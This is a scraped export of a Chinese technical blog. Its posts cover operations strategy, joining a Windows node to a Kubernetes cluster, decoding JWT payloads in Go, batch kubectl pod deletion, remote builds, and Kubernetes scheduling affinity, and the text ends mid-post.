用兵的妙处不在于兵甲，而在于借势。\n赤壁之战，火烧战船，东吴大胜，曹操败走华容道，借的是火。关羽水淹七军，活捉了于禁和庞德，大败曹军，借的是水。战争的残忍在于，杀敌一千自损八百，而广为流传的战役必然是超出人们认知，以极小的代价换取极大胜利成果的。以少胜多，以弱克强，都需要借势。\n兵甲再强，也强不过势。势是聚集的一种趋势，兵甲只是其中的一个单元。\n所谓借势，就是在自我比较弱小的情况下，借助外部一些强大的伙伴或者一些特殊的事件，提升自己的影响力，进攻直接的竞争对手。有些类似远交近攻的策略，只不过这里的远指的是领域差别大。\n单一目标的合作是不可靠的，事半功倍，多方共赢，才是合作的唯一标准。找到自身与直接领域外强大伙伴的合作点，是运营过程中的挑战。\n顺势而为，借势而为是最好的运营策略。\n","description":"","id":300,"section":"post","tags":["博文","研发","思考"],"title":"研发如练兵，运营如用兵","uri":"https://www.chenshaowen.com/blog/the-strategy-for-rd-and-ops.html"},{"content":" 这里主要使用 Windows 节点作为 Worker，而 Master 控制平面依然在 Linux 。\n1. 系统配置 1.1 Kubernetes 控制平面 Kubernetes 自 1.14 版本，增加了对 Windows 节点生产级的支持。由于微软官方文档主要提供的是 flannel 网络插件的安装方式，这里建议 Kubernetes 也采用 flannel 插件。\n查看当前集群 Kubernetes 版本 1 2 3 4 kubectl version Client Version: version.Info{Major:\u0026#34;1\u0026#34;, Minor:\u0026#34;17\u0026#34;, GitVersion:\u0026#34;v1.17.6\u0026#34;, GitCommit:\u0026#34;d32e40e20d167e103faf894261614c5b45c44198\u0026#34;, GitTreeState:\u0026#34;clean\u0026#34;, BuildDate:\u0026#34;2020-05-20T13:16:24Z\u0026#34;, GoVersion:\u0026#34;go1.13.9\u0026#34;, Compiler:\u0026#34;gc\u0026#34;, Platform:\u0026#34;linux/amd64\u0026#34;} Server Version: version.Info{Major:\u0026#34;1\u0026#34;, Minor:\u0026#34;17\u0026#34;, GitVersion:\u0026#34;v1.17.6\u0026#34;, GitCommit:\u0026#34;d32e40e20d167e103faf894261614c5b45c44198\u0026#34;, GitTreeState:\u0026#34;clean\u0026#34;, BuildDate:\u0026#34;2020-05-20T13:08:34Z\u0026#34;, GoVersion:\u0026#34;go1.13.9\u0026#34;, Compiler:\u0026#34;gc\u0026#34;, Platform:\u0026#34;linux/amd64\u0026#34;} flannel 配置 在全部节点上启用到 iptables 链的桥接 IPv4 流量\n1 sysctl net.bridge.bridge-nf-call-iptables=1 配置参数，在 net-conf.json 中添加 VNI 和 Port 端口\n1 kubectl -n kube-system edit cm kube-flannel-cfg net-conf.json: | { \u0026#34;Network\u0026#34;: \u0026#34;10.244.0.0/16\u0026#34;, \u0026#34;Backend\u0026#34;: { \u0026#34;Type\u0026#34;: \u0026#34;vxlan\u0026#34;, \u0026#34;VNI\u0026#34; : 4096, \u0026#34;Port\u0026#34;: 4789 } } 重启 flannel\n1 kubectl rollout restart ds kube-flannel-ds-amd64 -n kube-system 安装 Windows 的 flannel 和 kube-proxy 相关的 Daemonset 1 2 curl -L https://github.com/kubernetes-sigs/sig-windows-tools/releases/latest/download/kube-proxy.yml | sed \u0026#39;s/VERSION/v1.17.6/g\u0026#39; | kubectl apply -f - kubectl apply -f https://github.com/kubernetes-sigs/sig-windows-tools/releases/latest/download/flannel-overlay.yml 查看 1 2 3 4 kubectl get all --all-namespaces |grep windows kube-system daemonset.apps/kube-flannel-ds-windows-amd64 0 0 0 0 0 \u0026lt;none\u0026gt; 34s kube-system daemonset.apps/kube-proxy-windows 0 0 0 0 0 kubernetes.io/os=windows 36s 由于没有 Windows 节点，无法调度相关 Pod ，这里只有 Daemonset 而没有 Pod 。\n生成一个 Join Token 用于添加节点 1 2 3 kubeadm token create --print-join-command kubeadm join 192.168.13.43:6443 --token b29c63.aqvsg0953edz2ozw --discovery-token-ca-cert-hash sha256:529c64ad705bf356a2efa3c1bdb8181b852e2bc5d46f5d161dee1105e872bae6 1.2 Windows 节点 对 Windows OS 要求：\nWindows Server Version 1803+ Docker Version 17.06+ 我使用的是 Windows Server 2019 英文版，在运行中执行 winver 可以查看到系统为 1809 版本。\n有些文档描述需要两张网卡，因为 Flannel 默认会占用一张名为 Ethernet 的网卡，但我发现并不需要。\n开启 Hyper-v，用于安装 Docker 1 Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V -All 重启后，再继续操作。\n开启 RRAS 功能，用于 Pod 跨主机通信 重启后，再继续操作。\n2. Windows 节点配置 2.1 安装 Docker 以 Administrator 权限运行 PowerShell 。\n安装 Docker 1 2 3 Install-Module -Name DockerMsftProvider -Repository PSGallery -Force Install-Package -Name docker -ProviderName DockerMsftProvider -Force -RequiredVersion 18.09 Restart-Computer -Force 启动 Docker 1 Start-Service docker 查看 Docker 版本 1 2 3 docker -v Docker version 18.09.11, build 6112046bc9 2.2 [可选]配置 Kubectl 拷贝 Master 节点的 .kube/config 文件到 Windows 的 C:\\node 目录下 1 2 mkdir C:/node scp -r root@your_master_host_ip:/root/.kube/config C:/node/config 下载对应版本的 Kubernetes Windows 节点组件 v1.17.6 的下载地址为: https://github.com/kubernetes/kubernetes/blob/master/CHANGELOG/CHANGELOG-1.17.md#v1176 。\n下载文件 kubernetes-node-windows-amd64.tar.gz ，解压，找到 bin 目录，拷贝 kubectl 文件到 C:\\node 目录下\n1 2 3 4 ls C:\\node config kubectl 环境变量配置 配置组件路径到环境变量\n1 [Environment]::SetEnvironmentVariable(\u0026#34;Path\u0026#34;, $env:Path + \u0026#34;;C:\\node\u0026#34;, [EnvironmentVariableTarget]::Machine) 配置 kubeconfig 路径到环境变量\n1 [Environment]::SetEnvironmentVariable(\u0026#34;KUBECONFIG\u0026#34;, \u0026#34;C:\\node\\config\u0026#34;, [EnvironmentVariableTarget]::User) 再次打开命令行工具才会生效。\n2.3 添加 Windows 节点 初始化 Windows 节点 1 2 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 wget https://github.com/kubernetes-sigs/sig-windows-tools/releases/download/v0.1.2/PrepareNode.ps1 -o PrepareNode.ps1 1 ./PrepareNode.ps1 -KubernetesVersion v1.17.6 如果执行过程中报错，将会很难调试，需要单步执行 PrepareNode.ps1 脚本。\n添加节点 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 kubeadm join 192.168.13.43:6443 --token b29c63.aqvsg0953edz2ozw --discovery-token-ca-cert-hash sha256:529c64ad705bf356a2efa3c1bdb8181b852e2bc5d46f5d161dee1105e872bae6 W0613 12:53:11.738383 1576 join.go:346] [preflight] WARNING: JoinControlPane.controlPlane settings will be ignored when control-plane flag is not set. [preflight] Running pre-flight checks [preflight] Reading configuration from the cluster... [preflight] FYI: You can look at this config file with \u0026#39;kubectl -n kube-system get cm kubeadm-config -oyaml\u0026#39; W0613 12:53:13.019694 1576 defaults.go:186] The recommended value for \u0026#34;clusterDNS\u0026#34; in \u0026#34;KubeletConfiguration\u0026#34; is: [10.233.0.10]; the provided value is: [169.254.25.10] W0613 12:53:13.020730 1576 defaults.go:186] The recommended value for \u0026#34;authentication.x509.clientCAFile\u0026#34; in \u0026#34;KubeletConfiguration\u0026#34; is: \\etc\\kubernetes\\pki\\ca.crt; the provided value is: /etc/kubernetes/pki/ca.crt [kubelet-start] Downloading configuration for the kubelet from the \u0026#34;kubelet-config-1.17\u0026#34; ConfigMap in the kube-system namespace [kubelet-start] Writing kubelet configuration to file \u0026#34;\\\\var\\\\lib\\\\kubelet\\\\config.yaml\u0026#34; [kubelet-start] Writing kubelet environment file with flags to file \u0026#34;\\\\var\\\\lib\\\\kubelet\\\\kubeadm-flags.env\u0026#34; [kubelet-start] Starting the kubelet [kubelet-start] Waiting for the kubelet to perform the TLS Bootstrap... This node has joined the cluster: * Certificate signing request was sent to apiserver and a response was received. * The Kubelet was informed of the new secure connection details. Run \u0026#39;kubectl get nodes\u0026#39; on the control-plane to see this node join the cluster. 查看节点 Windows 相关的镜像都很大，需要多等待一会儿才能 Ready 。\n1 2 3 4 5 kubectl get node -o wide --show-labels NAME STATUS ROLES AGE VERSION INTERNAL-IP EXTERNAL-IP OS-IMAGE KERNEL-VERSION CONTAINER-RUNTIME LABELS i-fuu1ub1t Ready \u0026lt;none\u0026gt; 9h v1.17.6 192.168.13.55 \u0026lt;none\u0026gt; Windows Server 2019 Standard 10.0.17763.379 docker://18.9.11 beta.kubernetes.io/arch=amd64,beta.kubernetes.io/os=windows,kubernetes.io/arch=amd64,kubernetes.io/hostname=i-fuu1ub1t,kubernetes.io/os=windows,node.kubernetes.io/windows-build=10.0.17763 node1 Ready master,worker 9h v1.17.6 192.168.13.43 \u0026lt;none\u0026gt; CentOS Linux 7 (Core) 3.10.0-957.21.3.el7.x86_64 docker://19.3.8 beta.kubernetes.io/arch=amd64,beta.kubernetes.io/os=linux,kubernetes.io/arch=amd64,kubernetes.io/hostname=node1,kubernetes.io/os=linux,node-role.kubernetes.io/master=,node-role.kubernetes.io/worker= 3. 创建并查看负载 创建 Deploy 1 kubectl run iis --image=microsoft/iis --overrides=\u0026#39;{\u0026#34;spec\u0026#34;: { \u0026#34;nodeSelector\u0026#34;: { \u0026#34;kubernetes.io/os\u0026#34;: \u0026#34;windows\u0026#34; } } }\u0026#39; 创建 Service 1 kubectl expose deploy iis --type=NodePort --port=80 --target-port=80 查看负载 1 2 3 4 5 6 7 8 9 10 11 kubectl get pod,deploy,svc -o wide NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES pod/iis-5575988c89-cz66z 1/1 Running 0 42m 10.233.65.4 i-fuu1ub1t \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; NAME READY UP-TO-DATE AVAILABLE AGE CONTAINERS IMAGES SELECTOR deployment.apps/iis 1/1 1 1 63m iis microsoft/iis run=iis NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE SELECTOR service/iis NodePort 10.233.23.109 \u0026lt;none\u0026gt; 80:30552/TCP 11m run=iis service/kubernetes ClusterIP 10.233.0.1 \u0026lt;none\u0026gt; 443/TCP 8h \u0026lt;none\u0026gt; 页面查看服务 查看 Windows Server 上的镜像和容器 1 2 3 4 5 6 7 8 9 docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 23fa7cbbe450 mcr.microsoft.com/k8s/core/pause:1.2.0 \u0026#34;cmd /S /C \u0026#39;cmd /c p…\u0026#34; 18 seconds ago Up 18 seconds k8s_POD_iis-776c85bc49-9hrn9_default_20a5eac5-9335-4ce6-b4e5-0e1a0fcadc5c_1293 9a8a58dcd2c4 b5fe926a6fe0 \u0026#34;powershell -file /v…\u0026#34; 19 seconds ago Up 16 seconds k8s_kube-proxy_kube-proxy-windows-rtlvf_kube-system_73093c85-a6fa-4da4-a153-c8cb2e0f3ff4_0 23ef060dd278 mcr.microsoft.com/k8s/core/pause:1.2.0 \u0026#34;cmd /S /C \u0026#39;cmd /c p…\u0026#34; 20 seconds ago Up 19 seconds k8s_POD_kube-proxy-windows-rtlvf_kube-system_73093c85-a6fa-4da4-a153-c8cb2e0f3ff4_788 09b765ebeb13 mcr.microsoft.com/k8s/core/pause:1.2.0 \u0026#34;cmd /S /C \u0026#39;cmd /c p…\u0026#34; 20 seconds ago Up 20 seconds k8s_POD_iis-5575988c89-cz66z_default_0181697d-8356-463b-8e55-a0183c9cf3fe_736 105f32355a94 9499a92cb176 \u0026#34;powershell -file /e…\u0026#34; 46 seconds ago Up 43 seconds k8s_kube-flannel_kube-flannel-ds-windows-amd64-fgkv8_kube-system_46d18acf-7ff1-4673-aca8-50eba8aac221_0 e08cc8145660 mcr.microsoft.com/k8s/core/pause:1.2.0 \u0026#34;cmd /S /C \u0026#39;cmd /c p…\u0026#34; 47 seconds ago Up 46 seconds k8s_POD_kube-flannel-ds-windows-amd64-fgkv8_kube-system_46d18acf-7ff1-4673-aca8-50eba8aac221_117 1 2 3 4 5 6 7 docker images REPOSITORY TAG IMAGE ID CREATED SIZE sigwindowstools/kube-proxy v1.17.6 b5fe926a6fe0 12 hours ago 5.07GB microsoft/iis latest 0916eec6d2f2 3 days ago 5.18GB sigwindowstools/flannel 0.12.0 9499a92cb176 2 months ago 5.06GB mcr.microsoft.com/k8s/core/pause 1.2.0 a74290a8271a 11 months ago 253MB Windows 镜像真够大的。\n4. 可能碰到的一些问题 主要的问题是，现在的大部分文档不具有普适性。也就是，只有在特定的 Windows 、Kubernetes 、Docker 、Network 环境下，才能安装成功，同时会遇到各种各样查不到的错误提示。如果没有比较深入地理解 Kubernetes 的运行机制，整个过程将会非常艰难。\n4.1 Kubelet 起不来 在有的版本中，kubelet 一直起不来，需要将 C:\\var\\lib\\kubelet\\etc\\kubernetes\\pki\\ca.crt 证书拷贝到 C:\\var\\lib\\kubelet\\etc\\kubernetes\\ssl\\ca.art 。\n4.2 Network host not found 这是 kubectl describe 的 Event 中出现的一个错误提示。\n查看 Docker 的 Network :\n1 2 3 4 5 docker network ls NETWORK ID NAME DRIVER SCOPE efc374609b5e nat nat local ed0985e480b1 none null local 发现没有 host 网络，由于使用了 Hyper-V，这里不能使用 host 类型的网络，而是 nat 类型名为 host 的网络。\n1 docker network create -d nat host 4.3 找不到 /run/flannel/subnet.env 在 master 节点上，执行\n1 cat /run/flannel/subnet.env 得到子网配置如下：\n1 2 3 4 FLANNEL_NETWORK=10.233.64.0/18 FLANNEL_SUBNET=10.233.64.1/24 FLANNEL_MTU=1450 FLANNEL_IPMASQ=true 在 Windows 节点上新建文件 C:\\run\\flannel\\subnet.env ，增加上面查看到的内容。\n4.4 Pod 一直初始化起不来 Windows 系统下的 pause 镜像，并不是通用的，不同版本的系统需要不同的 pause 镜像。在 Kubelet 的启动参数中，可以修改镜像。\n编辑 C:\\k\\StartKubelet.ps1 文件，然后重启 Kubelet 组件。\n4.5 安装 KB4489899 补丁 使用 vxlan 模式下的 Flannel 配置虚拟覆盖网络，需要安装 Windows Server 2019 with KB4489899。\n5. 参考 https://docs.microsoft.com/en-us/virtualization/windowscontainers/kubernetes/joining-windows-workers https://kubernetes.io/docs/tasks/administer-cluster/kubeadm/adding-windows-nodes/ https://feisky.gitbooks.io/kubernetes/deploy/windows.html http://logicalshift.blogspot.com/2019/07/windows-kubernetes-nodes.html https://docs.microsoft.com/zh-cn/virtualization/windowscontainers/kubernetes/getting-started-kubernetes-windows ","description":"","id":301,"section":"post","tags":["博文","Kubernetes","Windows","节点","安装"],"title":"Kubernetes 添加 Windows 节点","uri":"https://www.chenshaowen.com/blog/add-windows-node-for-k8s.html"},{"content":" 在对 JWT 进行 Base64 解码时，发现 JSON 数据不完整。本文主要介绍相关知识点并解决这个问题。\n1. JWT 简介 JWT 通过在 Header 中设置 Authorization: Bearer \u0026lt;token\u0026gt; 进行认证的传递。\nJWT Token 是一个 . 连接的 Base64 编码字符串，类似这样 Header.Payload.Signature ，有三部分组成：\nHeader ，定义 Token 类型和加密算法 1 2 3 4 { \u0026#34;alg\u0026#34;: \u0026#34;HS256\u0026#34;, \u0026#34;typ\u0026#34;: \u0026#34;JWT\u0026#34; } Payload ，负载信息，通常是 iss（签发者），exp（过期时间），sub（面向的用户），aud（接收方），iat（签发时间）等 1 2 3 4 5 { \u0026#34;sub\u0026#34;: \u0026#34;1234567890\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;John Doe\u0026#34;, \u0026#34;admin\u0026#34;: true } Signature ，对 Base64 编码的 Header 和 Playload 进行签名，防止信息被篡改。 1 2 3 4 5 HMACSHA256( base64UrlEncode(header) + \u0026#34;.\u0026#34; + base64UrlEncode(payload), your-256-bit-secret ) jwt.io 提供了一个在线解析 Token 的工具。\n2. Base64 解码 \u0026ldquo;encoding/base64\u0026rdquo; 提供了四种编码和解码的方法：\nStdEncoding ， 常规编码，不足 3 倍时，使用 = 补齐 URLEncoding ， URL safe 编码，替换掉字符串中的特殊字符 +/ 转化成 -_ RawStdEncoding ， 常规编码，末尾不补 = RawURLEncoding ， URL safe 编码，末尾不补 = 下面，通过具体代码，看看它们之间的差别。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 package main import ( \u0026#34;encoding/base64\u0026#34; \u0026#34;fmt\u0026#34; ) func coding(msg []byte){ fmt.Println(\u0026#34;Input :\u0026#34;, string(msg)) encoded := base64.StdEncoding.EncodeToString(msg) fmt.Println(\u0026#34;StdEncoding :\u0026#34;, encoded) decoded, _ := base64.StdEncoding.DecodeString(encoded) fmt.Println(\u0026#34;StdEncoding :\u0026#34;, string(decoded)) encoded = base64.URLEncoding.EncodeToString(msg) fmt.Println(\u0026#34;URLEncoding :\u0026#34;, encoded) decoded, _ = base64.URLEncoding.DecodeString(encoded) fmt.Println(\u0026#34;URLEncoding :\u0026#34;, string(decoded)) encoded = base64.RawStdEncoding.EncodeToString(msg) fmt.Println(\u0026#34;RawStdEncoding :\u0026#34;, encoded) decoded, _ = base64.RawStdEncoding.DecodeString(encoded) fmt.Println(\u0026#34;RawStdEncoding :\u0026#34;, string(decoded)) encoded = base64.RawURLEncoding.EncodeToString(msg) fmt.Println(\u0026#34;RawURLEncoding :\u0026#34;, encoded) decoded, _ = base64.RawURLEncoding.DecodeString(encoded) fmt.Println(\u0026#34;RawURLEncoding :\u0026#34;, string(decoded)) } func main() { // 补齐 coding([]byte(\u0026#34;https://www.chenshaowen.com/\u0026#34;)) // URL Safe 编码 coding([]byte(\u0026#34;abc123!?$*\u0026amp;()\u0026#39;-=@~\u0026#34;)) } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 Input : https://www.chenshaowen.com/ StdEncoding : aHR0cHM6Ly93d3cuY2hlbnNoYW93ZW4uY29tLw== StdEncoding : https://www.chenshaowen.com/ URLEncoding : aHR0cHM6Ly93d3cuY2hlbnNoYW93ZW4uY29tLw== URLEncoding : https://www.chenshaowen.com/ RawStdEncoding : aHR0cHM6Ly93d3cuY2hlbnNoYW93ZW4uY29tLw RawStdEncoding : https://www.chenshaowen.com/ RawURLEncoding : aHR0cHM6Ly93d3cuY2hlbnNoYW93ZW4uY29tLw RawURLEncoding : https://www.chenshaowen.com/ Input : abc123!?$*\u0026amp;()\u0026#39;-=@~ StdEncoding : YWJjMTIzIT8kKiYoKSctPUB+ StdEncoding : abc123!?$*\u0026amp;()\u0026#39;-=@~ URLEncoding : YWJjMTIzIT8kKiYoKSctPUB- URLEncoding : abc123!?$*\u0026amp;()\u0026#39;-=@~ RawStdEncoding : YWJjMTIzIT8kKiYoKSctPUB+ RawStdEncoding : abc123!?$*\u0026amp;()\u0026#39;-=@~ RawURLEncoding : YWJjMTIzIT8kKiYoKSctPUB- RawURLEncoding : abc123!?$*\u0026amp;()\u0026#39;-=@~ 从输出的结果来看：\nStdxxx 会对 Base64 编码执行补齐 URLxxx 会对 Base64 编码进行转码 Base64 是公开的标准编码规则，但不同的库实现时，暴露出来的接口会有差异，使用正确的接口才能获得预期的结果。\n3. JWT Playload 少了一部分 下面这段代码截取了 Playload 部分进行解析：\n1 2 3 4 5 6 7 8 9 10 11 12 package main import ( \u0026#34;encoding/base64\u0026#34; \u0026#34;fmt\u0026#34; ) func main() { decoded := \u0026#34;eyJ1c2VybmFtZSI6ImFkbWluIiwidWlkIjoiYjhiZTZlZGQtMmM5Mi00NTM1LTliMmEtZGY2MzI2NDc0NDU4IiwiaWF0IjoxNTkxMzU0MDEwLCJpc3MiOiJrdWJlc3BoZXJlIiwibmJmIjoxNTkxMzU0MDEwfQ\u0026#34; encoded, _ := base64.StdEncoding.DecodeString(decoded) fmt.Println(string(encoded)) } 得到结果：\n1 {\u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34;,\u0026#34;uid\u0026#34;:\u0026#34;b8be6edd-2c92-4535-9b2a-df6326474458\u0026#34;,\u0026#34;iat\u0026#34;:1591354010,\u0026#34;iss\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;nbf\u0026#34;:1591354010 发现，这并不是一个完整的 Json 对象。在 dgrijalva/jwt-go 库中，可以看到 EncodeSegment 函数的实现：\n1 2 3 4 // Encode JWT specific base64url encoding with padding stripped func EncodeSegment(seg []byte) string { return strings.TrimRight(base64.URLEncoding.EncodeToString(seg), \u0026#34;=\u0026#34;) } 显然，dgrijalva/jwt-go 使用的是 RawURLEncoding 的方式进行编码。\n调整之后，执行下面这段代码：\n1 2 3 4 5 6 7 8 9 10 11 12 package main import ( \u0026#34;encoding/base64\u0026#34; \u0026#34;fmt\u0026#34; ) func main() { decoded := \u0026#34;eyJ1c2VybmFtZSI6ImFkbWluIiwidWlkIjoiYjhiZTZlZGQtMmM5Mi00NTM1LTliMmEtZGY2MzI2NDc0NDU4IiwiaWF0IjoxNTkxMzU0MDEwLCJpc3MiOiJrdWJlc3BoZXJlIiwibmJmIjoxNTkxMzU0MDEwfQ\u0026#34; encoded, _ := base64.RawURLEncoding.DecodeString(decoded) fmt.Println(string(encoded)) } 得到正确结果：\n1 {\u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34;,\u0026#34;uid\u0026#34;:\u0026#34;b8be6edd-2c92-4535-9b2a-df6326474458\u0026#34;,\u0026#34;iat\u0026#34;:1591354010,\u0026#34;iss\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;nbf\u0026#34;:1591354010} 另外一种方式是，使用 dgrijalva/jwt-go 内置的解析器，提供完整的 JWT Token 进行解析。可以看看下面这段代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package main import ( \u0026#34;github.com/dgrijalva/jwt-go\u0026#34; \u0026#34;fmt\u0026#34; ) func main() { decoded := \u0026#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwidWlkIjoiYjhiZTZlZGQtMmM5Mi00NTM1LTliMmEtZGY2MzI2NDc0NDU4IiwiaWF0IjoxNTkxMzU0MDEwLCJpc3MiOiJrdWJlc3BoZXJlIiwibmJmIjoxNTkxMzU0MDEwfQ.psKkj8vYWm9Crf9jnbB_PNestLNksaS9vuMvQI3C-dU\u0026#34; type Claims struct { Username string `json:\u0026#34;username\u0026#34;` UID string `json:\u0026#34;uid\u0026#34;` jwt.StandardClaims } claim := Claims{} parser := jwt.Parser{} parser.ParseUnverified(decoded, \u0026amp;claim) fmt.Println(claim.Username) } 得到预期结果：\nadmin 4. 参考 https://jwt.io/ ","description":"","id":302,"section":"post","tags":["博文","Go","JWT","编码","Base64"],"title":"使用 Base64 解码 JWT Playload 数据不完整","uri":"https://www.chenshaowen.com/blog/incomplete-data-using-base64-decoding-jwt-playload.html"},{"content":"1. 批量删除 Evicted 状态的 Pod 1 kubectl get pods --all-namespaces -o wide | grep Evicted | awk \u0026#39;{print $1,$2}\u0026#39; | xargs -L1 kubectl delete pod -n 2. 批量删除指定空间指定状态的 Pod 根据 field-selectors ，可以删除指定空间指定状态的 Pod 。\n1 kubectl get pods --field-selector=status.phase!=Running -n default | cut -d\u0026#39; \u0026#39; -f 1 | xargs kubectl delete pod -n default ","description":"","id":303,"section":"post","tags":["博文","Kubernetes"],"title":"Kubernetes 批量操作命令","uri":"https://www.chenshaowen.com/blog/batch-command-of-kubernetes.html"},{"content":"1. 提高自动化水平 远端构建通常需要借助一定的 CI 工具，比如 Github Actions 、Travis CI 等。如果是内网环境，可以借助 GitLab CI ，添加一个 CI 节点进行自动化构建，可以参考 我的 GitLab 文档 。\n自动化的好处不言而喻，能规范流程、节约大量时间，具有明显的收益。\n2. 有利于其他人参与 高配的本地开发环境容易产生大量碎片化、不可复制的配置。这些配置有的用于项目参数，有的用于开发调试，有的用于构建编译。如果换一台机器或者换一个人进行开发，会带来极大的成本。\n这些配置也是项目的一部分，开发人员需要提供一种可复用的方式分享给其他人。项目不应该与某个人或某台机器绑定在一起，能集体参与是保持项目活力的关键因素之一。\n3. 版本可追溯、可复现 版本的一次发行需要很多准备工作。在代码层面，除了新建 Branch、Tag ，还有一件很重要的事情是，保证版本的可追溯、可复现。\n在继续发行了很多版本之后，很有可能需要针对之前的某一个版本进行修复。即使宣布了支持的版本范围，也需要考虑社区友好，如果是重要的商业用户需要，也会突破支持的版本限制。最终的结果就是，不得不修复。\n版本的可追溯、可复现指的是，在若干版本之后，将仓库代码回到某条记录，使用工具能将版本打包出来。因此，构建机器的相关配置也是项目的一部分。\n4. 更低的成本 相较于每人一台高配的开发机，共用一台高配的开发机成本更低。本地的环境应该更多用于编辑、调试，而不是编译、发行版本，超过需求配额的机器是不必要的。\n5. 适合远程办公 非集中式的办公时间容易被打断，工作场地不稳定，另外开发设备的安全也是需要考虑的方面。这种情况下，更多的工作应该交给远端，减少因工作环境发生变化而产生的成本。使用一些 SaaS 管理信息流，使用远端主机自动化完成一些工作十分有必要。在很短的有效工作时间片段里，我们只完成具有创造性的编辑工作，提交即可。剩下的事情，交给远端自动化工具帮你完成。\n","description":"","id":304,"section":"post","tags":["博文","思考","研发","构建"],"title":"为什么要使用远端构建","uri":"https://www.chenshaowen.com/blog/why-should-we-use-remote-build.html"},{"content":"1. Kubernetes 中的调度器 kube-scheduler 是 Kubernetes 中决定 Pending 状态的 Pod 运行在哪个 Node 的组件，被称之为调度器。\nKubernetes 中内置了大量的调度策略，也提供了一些高级调度策略（nodeAffinity、podAffinity 等），以供用户使用，基本能够满足绝大部分的业务需求。\n前面的文档 Kubernetes 之 Labels、Selectors 中提到， Labels、Selectors 是 Kubernetes 中非常重要的功能。Labels 关联了 Pod 、Deployment 、Service ，也用于调度策略，下面我们就来看看怎么使用 Labels 定制调度策略。\n2. nodeSelector 首先查看，Node 有哪些 Labels :\n1 2 3 4 5 6 kubectl get nodes --show-labels NAME STATUS ROLES AGE VERSION LABELS node1 Ready master,worker 17h v1.15.12 beta.kubernetes.io/arch=amd64,beta.kubernetes.io/os=linux,kubernetes.io/arch=amd64,kubernetes.io/hostname=node1,kubernetes.io/os=linux,node-role.kubernetes.io/master= node2 Ready worker 17h v1.15.12 beta.kubernetes.io/arch=amd64,beta.kubernetes.io/os=linux,kubernetes.io/arch=amd64,kubernetes.io/hostname=node2,kubernetes.io/os=linux,node-role.kubernetes.io/worker= node3 Ready worker 17h v1.15.12 beta.kubernetes.io/arch=amd64,beta.kubernetes.io/os=linux,kubernetes.io/arch=amd64,kubernetes.io/hostname=node3,kubernetes.io/os=linux,node-role.kubernetes.io/worker= 回顾一下 Labels 的基本操作:\n增加标签 1 kubectl label node node1 node-role.kubernetes.io/worker=ci 修改标签 1 kubectl label --overwrite node1 node-role.kubernetes.io/worker= 删除标签 1 kubectl label node node1 node-role.kubernetes.io/worker- 在使用 nodeSelector 时，在 Pod 的 Spec 字段中增加 nodeSelector ，说明 Node 需要同时满足的全部 Label 条件即可。下面这个例子，将 Pod 调度到具有 kubernetes.io/hostname=node1 Label 的 Node 上。\nspec: containers: - ... nodeSelector: kubernetes.io/hostname: node1 在 1.2 版本之后，Kubernetes 引入了 nodeAffinity ，功能上类似 nodeSelector ，nodeSelector 在后续版本中将被废除。\n3. nodeAffinity nodeAffinity 主要用于控制 Pod 应该运行在哪个 Node 上。亲和性调度有两种方式：\n软策略，尽量满足 硬策略，必须满足 这些策略是通过 Label 匹配进行判断的，Kubernetes 提供了几种操作符：\nIn， Label 在某个列表中 NotIn， Label 不在某个列表中 Gt， Label 大于某个值 Lt， Label 小于某个值 Exists， Label 存在 DoesNotExist，Label 不存在 通过这些操作符和 Label ，我们就可以定制自己的调度策略。下面是一个官方的示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 spec: containers: - ... nodeAffinity: requiredDuringSchedulingIgnoredDuringExecution: # 硬策略，强制满足 nodeSelectorTerms: - matchExpressions: - key: kubernetes.io/e2e-az-name operator: In values: - e2e-az1 - e2e-az2 preferredDuringSchedulingIgnoredDuringExecution: # 软策略，尽量满足 - weight: 1 preference: matchExpressions: - key: another-node-label-key operator: In values: - another-node-label-value 在 Pod 的 Spec 字段中，新增 nodeAffinity 字段进行描述。\n如果同时指定多个 nodeSelectorTerms ，那么 Node 只要满足其中一个条件即可调度。如果指定多个 matchExpressions ，那么 Node 必须满足所有条件才可以调度。\n4. podAffinity podAffinity 与 nodeAffinity 类似，只不过 nodeAffinity 描述的是 Pod 对 Node 的选择，而 podAffinity 描述的是 Pod 对 Pod 的选择。\npodAffinity 多了一个 topologyKey （拓扑域），这相当于给 Pod 的调度策略增加了一个选择 Node 的维度。首先 Node 的 Label 需要满足 topologyKey 的要求，再考察运行中的 Pod 带的 Label 是否满足亲和性的要求。\n下面这个例子要求 Pod 调度需要满足：\nNode 的 Label 必须有 failure-domain.beta.kubernetes.io/zone Node 上运行的 Pod Label 必须有 security=S1 尽量不要调度到 Label 有 kubernetes.io/hostname ，并且 Pod Label 有 security=S2 的 Node 上 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 spec: containers: - ... affinity: podAffinity: requiredDuringSchedulingIgnoredDuringExecution: #硬策略，强制满足 - labelSelector: matchExpressions: - key: security operator: In values: - S1 topologyKey: failure-domain.beta.kubernetes.io/zone podAntiAffinity: preferredDuringSchedulingIgnoredDuringExecution: #软策略，尽量满足 - weight: 100 podAffinityTerm: labelSelector: matchExpressions: - key: security operator: In values: - S2 topologyKey: kubernetes.io/hostname 5. taints、tolerations taints 针对的是 Node ， tolerations 针对的是 Pod。如果一个 Node 被标记为 taint ，那么这个 Node 将不被调度，除非 Pod 被设置 tolerations 容忍这个 taint。taints、tolerations 通常用在一些特殊的 Node 调度上，比如 master 、具有 GPU 的 Node 、SSD 硬盘的 Node 、内存很大的 Node 等。\ntaint 